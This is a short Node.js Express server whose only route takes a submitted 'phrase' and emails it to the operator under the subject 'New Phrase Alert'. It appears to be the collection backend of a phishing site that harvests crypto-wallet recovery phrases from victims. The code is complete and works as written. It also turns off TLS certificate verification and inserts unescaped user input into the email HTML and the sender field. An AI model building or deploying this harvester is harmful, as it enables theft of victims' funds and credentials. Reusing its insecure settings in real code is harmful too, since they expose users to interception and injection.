const express = require("express");
const router = express.Router();
const cors = require("cors");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const logger = require("morgan");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(logger("dev"));

app.post("/send", (req, res) => {
  const pushout = `
  <p> You have a new Phrase KeyWord</p>
  <ul>
  <li>Phrase: ${req.body.phrase}</li>
  `;

  let transporter = nodemailer.createTransport({
    host: process.env.THE_HOST,
    port: 465,
    secure: true, // true for 465, false for other ports
    auth: {
      user: process.env.WEBMAIL, // generated ethereal user
      pass: process.env.PASSWORD, // generated ethereal password
    },
    tls: {
      rejectUnauthorized: false,
    },
  });

  // send mail with defined transport object
  let mailOptions = {
    from: `${req.body.contactFirstName} <${req.body.contactEmail}>`,
    to: process.env.WEBMAIL, // list of receivers
    subject: "New Phrase Alert ✔", // Subject line
    text: "Hello there", // plain text body
    html: pushout, // html body
  };

  transporter.sendMail(mailOptions, function (err, data) {
    if (err) {
      console.log(err)
      res.status(400).json({
        status: "fail",
      });
    } else {
      console.log("== Message Sent ==");
      res.status(200).json({
        status: "success",
      });
    }
  });
});

app.get("/", (req, res) => res.send("welcome to a live server"));
app.listen(process.env.PORT || 5001, () => console.log("Server Running"));
